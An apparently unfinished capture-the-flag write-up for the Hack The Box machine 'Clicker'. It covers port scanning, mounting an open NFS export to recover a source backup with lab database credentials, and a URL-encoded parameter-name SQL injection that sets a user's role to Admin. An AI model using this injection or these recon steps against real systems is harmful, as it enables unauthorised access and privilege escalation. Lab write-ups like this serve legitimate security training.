# medium - Clicker

## User flag

We've found a PHP app:
```bash
~z➤ curl clicker.htb -I
HTTP/1.1 200 OK
Date: Tue, 17 Oct 2023 22:38:18 GMT
Server: Apache/2.4.52 (Ubuntu)
Set-Cookie: PHPSESSID=l8mi85ckmmg44fhainq9vk5huj; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Type: text/html; charset=UTF-8
```

Which I was only able to find these urls:
- /info.php
- /login.php
- /register.php
- /authenticate.php
- /create_player.php
- /profile.php

Also some leaked info from those php pages:
```html
    <p class="lead"> ButtonLover99 </p>
    <p class="lead"> Paol </p>
    <p class="lead"> Th3Br0 </p>
```


Thanks to nmap, we've found some ports to play with:
```bash
~z➤ sudo nmap -n -Pn -sV -O -T4 clicker.htb
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
111/tcp  open  rpcbind 2-4 (RPC #100000)
2049/tcp open  nfs_acl 3 (RPC #100227)
```

### Exploring RPC
As the web app seems to be a rabbit-hole, I'm testing RPC:
```bash
~z➤ rpcinfo -p clicker.htb
   program vers proto   port  service
...
    100005    3   udp  37978  mountd
    100005    3   tcp  35933  mountd
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
...

~z➤ showmount -e clicker.htb
Export list for clicker.htb:
/mnt/backups *

~z➤ sudo mount -t nfs clicker.htb:/mnt/backups n
~z➤ ls n
clicker.htb_backup.zip
```

And we got some src:
```bash
~z/src➤ unp clicker.htb_backup.zip
Archive:  clicker.htb_backup.zip
   creating: clicker.htb/
  inflating: clicker.htb/play.php
  inflating: clicker.htb/profile.php
  inflating: clicker.htb/authenticate.php
  inflating: clicker.htb/create_player.php
  inflating: clicker.htb/logout.php
   creating: clicker.htb/assets/
  inflating: clicker.htb/assets/background.png
  inflating: clicker.htb/assets/cover.css
  inflating: clicker.htb/assets/cursor.png
   creating: clicker.htb/assets/js/
  inflating: clicker.htb/assets/js/bootstrap.js.map
  inflating: clicker.htb/assets/js/bootstrap.bundle.min.js.map
  inflating: clicker.htb/assets/js/bootstrap.min.js.map
  inflating: clicker.htb/assets/js/bootstrap.bundle.min.js
  inflating: clicker.htb/assets/js/bootstrap.min.js
  inflating: clicker.htb/assets/js/bootstrap.bundle.js
  inflating: clicker.htb/assets/js/bootstrap.bundle.js.map
  inflating: clicker.htb/assets/js/bootstrap.js
   creating: clicker.htb/assets/css/
  inflating: clicker.htb/assets/css/bootstrap-reboot.min.css
  inflating: clicker.htb/assets/css/bootstrap-reboot.css
  inflating: clicker.htb/assets/css/bootstrap-reboot.min.css.map
  inflating: clicker.htb/assets/css/bootstrap.min.css.map
  inflating: clicker.htb/assets/css/bootstrap.css.map
  inflating: clicker.htb/assets/css/bootstrap-grid.css
  inflating: clicker.htb/assets/css/bootstrap-grid.min.css.map
  inflating: clicker.htb/assets/css/bootstrap-grid.min.css
  inflating: clicker.htb/assets/css/bootstrap.min.css
  inflating: clicker.htb/assets/css/bootstrap-grid.css.map
  inflating: clicker.htb/assets/css/bootstrap.css
  inflating: clicker.htb/assets/css/bootstrap-reboot.css.map
  inflating: clicker.htb/login.php
  inflating: clicker.htb/admin.php
  inflating: clicker.htb/info.php
  inflating: clicker.htb/diagnostic.php
  inflating: clicker.htb/save_game.php
  inflating: clicker.htb/register.php
  inflating: clicker.htb/index.php
  inflating: clicker.htb/db_utils.php
   creating: clicker.htb/exports/
  inflating: clicker.htb/export.php
```

What I've found at first glance:
```php
// ****** We can modify http session to be admin
if ($_SESSION["ROLE"] != "Admin") {
  header('Location: /index.php');
  die;
}

// Possible db creds
$db_server="localhost";
$db_username="clicker_db_user";
$db_password="clicker_db_password";
$db_name="clicker";
$mysqli = new mysqli($db_server, $db_username, $db_password, $db_name);
$pdo = new PDO("mysql:dbname=$db_name;host=$db_server", $db_username, $db_password);

// ***** We can create a User as Admin
function create_new_player($player, $password) {
	global $pdo;
	$params = ["player"=>$player, "password"=>hash("sha256", $password)];
	$stmt = $pdo->prepare("INSERT INTO players(username, nickname, password, role, clicks, level) VALUES (:player,:player,:password,'User',0,0)");
	$stmt->execute($params);
}

// ***** WTF
if (isset($_GET["token"])) {
    if (strcmp(md5($_GET["token"]), "ac0e5a6a3a50b5639e69ae6d8cd49f40") != 0) {
        header("HTTP/1.1 401 Unauthorized");
        exit;
	}
}
else {
    header("HTTP/1.1 401 Unauthorized");
    die;
}

try {
	$pdo = new PDO("mysql:dbname=$db_name;host=$db_server", $db_username, $db_password, array(PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION));
} catch(PDOException $ex){
    $connection_test = "KO";
}

// ***** Write to file
function random_string($length) {
    $key = '';
    $keys = array_merge(range(0, 9), range('a', 'z'));

    for ($i = 0; $i < $length; $i++) {
        $key .= $keys[array_rand($keys)];
    }

    return $key;
}
$filename = "exports/top_players_" . random_string(8) . "." . $_POST["extension"];
file_put_contents($filename, $s);

// ***** Hummm
      money = <?php echo $_SESSION["CLICKS"]; ?>;
      update_level = <?php echo $_SESSION["LEVEL"]; ?>;
      money = parseInt(money);
      update_level = parseInt(update_level);
      upgrade_cost = 15 * (5 ** update_level);
      money_increment = upgrade_cost / 15;

      function addcomma(x) {
        return x.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",")
      }

      function saveAndClose() {
        window.location.replace("/save_game.php?clicks="+money+"&level="+update_level);
      }

      function clicked() {
        money += money_increment;
        document.getElementById("total").innerHTML = "Clicks: " + addcomma(money);
      }

      function upgrade() {
        if (money >= upgrade_cost) {
          money_increment += upgrade_cost / 15;
          money -= upgrade_cost;
          update_level += 1;
          upgrade_cost = upgrade_cost * 5;
          document.getElementById("upgrade").innerHTML = addcomma(update_level) + " - LevelUP Cost: " + addcomma(upgrade_cost);
        }
  

        document.getElementById("click").innerHTML = "Level: " + addcomma(update_level);
        document.getElementById("total").innerHTML = "Clicks: " + addcomma(money);
      }

// ***** Here we can try to modify our role
if (isset($_SESSION['PLAYER']) && $_SESSION['PLAYER'] != "") {
	$args = [];
	foreach($_GET as $key=>$value) {
		if (strtolower($key) === 'role') {
			// prevent malicious users to modify role
			header('Location: /index.php?err=Malicious activity detected!');
			die;
		}
		$args[$key] = $value;
	}
	save_profile($_SESSION['PLAYER'], $_GET);
	// update session info
	$_SESSION['CLICKS'] = $_GET['clicks'];
	$_SESSION['LEVEL'] = $_GET['level'];
	header('Location: /index.php?msg=Game has been saved!');
}

// ***** And here the function that updates all player's fields
function save_profile($player, $args) {
	global $pdo;
  	$params = ["player"=>$player];
	$setStr = "";
  	foreach ($args as $key => $value) {
    		$setStr .= $key . "=" . $pdo->quote($value) . ",";
	}
  	$setStr = rtrim($setStr, ",");
  	$stmt = $pdo->prepare("UPDATE players SET $setStr WHERE username = :player");
  	$stmt -> execute($params);
}
```

So, it seems that we can access /play.php page and by Saving the game, it can store all our profile, anything we send via HTTP URL as Get Parameters, which means we can override the `role` field of our newly created user.

{{< limg "/i/2023-10-17_19-51.png" "Cannot bypass this" >}}

By encoding `role=` I was able to save succesfully the game: `GET /save_game.php?clicks=4&level=0&%72%6F%6C%65%3D'Admin'%23 HTTP/1.1' HTTP/1.1`. Which decoded is `/save_game.php?clicks=4&level=0&role='Admin'#`

## Root flag
## TODOs
